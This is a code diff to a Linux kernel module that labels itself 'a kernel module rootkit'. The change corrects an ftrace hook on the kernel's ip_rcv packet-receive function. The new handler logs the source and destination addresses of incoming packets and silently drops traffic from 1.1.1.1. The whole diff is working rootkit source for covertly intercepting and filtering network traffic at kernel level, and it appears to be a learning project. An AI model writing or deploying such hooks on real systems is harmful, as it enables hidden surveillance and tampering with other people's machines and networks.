@@ -3,9 +3,12 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
-#include <linux/namei.h>
-#include <linux/dirent.h>
 #include <linux/tcp.h>
+#include <linux/ip.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+#include <net/ip.h>
+
 #include "ftrace_helper2.h"
 
 
@@ -15,17 +18,13 @@ MODULE_DESCRIPTION("a kernel module rootkit");
 MODULE_VERSION("1");
 
 
-//static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
-//static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
-
-asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
-	   struct net_device *orig_dev);
-
-asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
-	   struct net_device *orig_dev);
+ asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+ 	   struct net_device *orig_dev);
+ asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+ 	   struct net_device *orig_dev);
 
 static struct ftrace_hook hooks[] = {
- 	HOOK("ip_recv", new_ip_rcv, &old_ip_rcv),
+ 	HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
  };
 
 
@@ -39,7 +38,7 @@ static int __init rootkit_enter(void) {
 		return err;
 
 
-	return 0;
+	 return 0;
 }
 
 static void __exit rootkit_exit(void) {
@@ -54,8 +53,20 @@ static void __exit rootkit_exit(void) {
 
 asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev) {
-	printk("hooked ip_recv! hooray\n");
+
+	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
+	unsigned int src_ip = (unsigned int)ip_header->saddr;
+	unsigned int dest_ip = (unsigned int)ip_header->daddr;
+
+	printk(KERN_INFO "a: src IP address = %pI4 dst IP address = %pI4 src IP %x\n", &src_ip, &dest_ip, src_ip);
+	if (src_ip == 0x01010101)
+	{
+		printk(KERN_INFO "a: found traffic from 1.1.1.1\n");
+		return NET_RX_DROP;
+	}
+	//printk("hooked ip_rcv! hooray\n");
 	return old_ip_rcv(skb, dev, pt, orig_dev);
+
 
 }
 
